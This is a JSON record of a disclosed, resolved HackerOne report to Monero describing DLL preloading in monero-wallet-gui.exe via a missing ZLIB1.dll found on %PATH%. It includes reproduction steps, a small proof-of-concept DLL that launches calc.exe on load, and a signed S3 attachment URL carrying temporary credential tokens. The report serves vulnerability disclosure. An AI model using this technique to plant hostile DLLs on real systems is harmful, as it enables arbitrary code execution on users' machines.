@@ -1,0 +1,179 @@
+{
+  "id": 896338,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTYzMzg=",
+  "url": "https://hackerone.com/reports/896338",
+  "title": "Misconfiguration in build environment allows DLL preloading attack",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-11T20:59:35.213Z",
+  "submitted_at": "2020-06-11T20:59:35.213Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "nim4",
+    "url": "/nim4",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7731,
+    "url": "https://hackerone.com/monero",
+    "handle": "monero",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/731/55634f7fcd917725c7a5771cc6e7c9b4d5fe0c22_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Monero",
+      "twitter_handle": "monero",
+      "website": "https://getmonero.org",
+      "about": " Monero: the secure, private, untraceable cryptocurrency"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-01-29T17:08:01.081Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-12-30T17:07:58.256Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n`monero-wallet-gui.exe` tries to dynamically load some dynamic link libraries(DLL) which are not present in the applications directory, so `LoadLibraryA` system-call will search other directories such as Windows root and %PATH% for them. An attacker can gain arbitrary code execution if he/she has write permission to any of the directories within the `%PATH%`.\n\nList of DDLs:\n- `ZLIB1.dll` \n- `perf.dll` loaded by `atio6axx.dll` (AMD OpenGL)\n\n## Releases Affected:\n\nTried on `v0.16.0.0` on Windows 10 Home Edition with AMD GPU\n\n## Steps To Reproduce:\n\n  1.  Create a DLL and put the exploit in `DLL_PROCESS_ATTACH` event.\n  2. Rename the DLL to `ZLIB1.dll`\n  3. Copy the DLL to any directory in the path(`echo %PATH%`)\n  4. Run `monero-wallet-gui.exe`\n\n## Supporting Material/References:\n\nPoC DLL:\n```\n#include <windows.h>\n\nBOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)\n{\n    switch(fdwReason)\n    {\n        case DLL_PROCESS_ATTACH:\n            system(\"cmd /Q /D /C calc.exe\");\n        case DLL_PROCESS_DETACH:\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n            break;\n    }\n    \n    return TRUE;\n}\n```\n\n## Housekeeping\n\nAddress: 8C5XAD3aAH9CfwCh7M8vhXgzyLPCLQTPWJk6nXnxGPpH2dGfEShuWWzdXqz92tWu2874A13BEwp6SeGhWK6MAJzvKCxZW4L\n\n## Impact\n\nArbitrary code execution and  privilege escalation",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 864652,
+      "file_name": "poc.mkv",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kpLLNPSJ7U2ozVab4KqRrGci?response-content-disposition=attachment%3B%20filename%3D%22poc.mkv%22%3B%20filename%2A%3DUTF-8%27%27poc.mkv&response-content-type=video%2Fx-matroska&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LIMANAX%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T054156Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjED0aCXVzLXdlc3QtMiJIMEYCIQCnj8u5TOH%2BocHJ%2BlLjpJlZE%2BfARTx%2F0Uzt3YV6HyXFXAIhAIU%2FPdoGgtYUfu%2F67dNAXIqagWgeGQd%2FZpPw6uQQd46kKrIFCAYQAxoMMDEzNjE5Mjc0ODQ5IgyJLyuZhXWmhLcrHHcqjwWA8G2ZK55wMKrRK%2BqJ%2FS%2B7f34rWK%2B44pRqCps5EdHLvhLCoQE0uMytJXlGAPLtOvqY8qt6v6vzLwIGoI1MDS7SEHuyRl9QHt7RdqnRhKQ8u2MPQsGAlkES6sYII31D5T3If5WMg6pkFYw4L4RO5pdWi%2FUDIzguyRMUtwexs%2FavfIjSZWNq0AwD%2B3%2Bd%2BR1cA8v0p0rn8U3sdUER%2BwgLtTFwX1B1gq2bMc8e586AzZxY8B1NZiLUC0dfqOF3UKhQxbg51dgBalP1DoT6ALhsFYA75OFREpLjCjaF2gYQD8lwJ0JdTrZc8dKYAeQfJgb1s%2B%2B8xo5cPkTCWplAZ%2BK4m6SGVmCuxljhPF4PrZ96xa3aqiq1b5MkuBaHpby3QeuhE0gSEvVyewfG6ZZ4apQt9yguLZ3jJq77Z2HXG2rGZXuTwrr0tHfApsE17%2BmC0Bpmw%2FoTAXRjvKV08PeZGVqLNMpTsuyKH8cwoy4cMW3ax1uFfe%2BonzpOMRe%2FCO3nY8t9ApvX%2FUsFo3q20VERDg1kYXdqdLdYEI4t5pD%2FRWySH6rXjrlX8xpF6SbUoVeBJEqgMPn7X2pU0L66Le4lBGDu6g%2BhJKtDthxLnFO0veTt6Ug9w17RPIP8H6OKr9JiExIUHnmQ7WyTDfCRg%2FtvJhxuwZ9zE3j4QhtZfMao3uGobSgOOwOe7C%2FAJ3CvYiHqXOzrsdcgeKBPYEp7ZT6y8F8mG6ssQOOlol5wkl4k8AENNjRILF4wnXw612LSTjef9FwCNxEPq4IEz2B%2BbPjw2tNsVaNBsora39nUFxuCUd%2BH8l8iy3RMpAFp%2BLGejEfE4ndEVvhhuq%2BSIGlNIZXNRRz5ge4AC9U6TZSytVG0ttimcnujMOWBndIGOrABc9acHCHcFpZnpqnIOM1pPrxV%2FWgXoXodUqC0s6%2BxWBxkiD48yICazCA3ET0IoNBkc9bhKetLaRT6BjGq7l1cQ3NrgNJ8%2BgPetN0RsJtInfHc0sb6OyaSXFBfhhkqwkL6VUkJYYEaO2uTaKwch3F15FSKTcuEFzGK7kKNh7XK00DxGgj30%2F1KsDHFrLCDcnty2leBvv4Yd2T9QIwphqwY3V6qAUwROCGXJk5vmlF4m30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=cfd20f07b195d2a5c649cd534fcd5ab613b2d3d77b7409678d82ee465f914245",
+      "file_size": 942207,
+      "type": "video/x-matroska",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-01-29T17:07:58.355Z",
+  "allow_singular_disclosure_after": -139581238.26564813,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "scarecow",
+    "tess",
+    "ibring",
+    "zelenskyy",
+    "hama122"
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "896338",
+  "votes": 5,
+  "latest_disclosable_activity_at": "2022-01-29T17:08:01.142Z",
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-03T13:41:56.727112",
+    "source": "https://hackerone.com/reports/896338.json",
+    "report_id": 896338
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTYzMzg=",
+    "databaseId": "896338",
+    "title": "Misconfiguration in build environment allows DLL preloading attack",
+    "url": "https://hackerone.com/reports/896338",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2022-01-29T17:08:01.081Z",
+    "created_at": "2020-06-11T20:59:35.213Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": {
+      "rating": "low",
+      "score": null
+    },
+    "reporter": {
+      "username": "nim4"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNzczMQ==",
+      "handle": "monero",
+      "name": "Monero",
+      "url": "https://hackerone.com/monero",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzg5NjMzOA==",
+    "_id": "896338",
+    "disclosed": true,
+    "votes": 5,
+    "latest_disclosable_activity_at": "2022-01-29T17:08:01.142Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTYzMzg=",
+      "databaseId": "896338",
+      "title": "Misconfiguration in build environment allows DLL preloading attack",
+      "url": "https://hackerone.com/reports/896338",
+      "disclosed_at": "2022-01-29T17:08:01.081Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpWdWxuZXJhYmlsaXR5RGlzY2xvc3VyZVByb2dyYW0vNzczMQ==",
+      "handle": "monero",
+      "name": "Monero",
+      "url": "https://hackerone.com/monero",
+      "currency": "usd"
+    }
+  }
+}
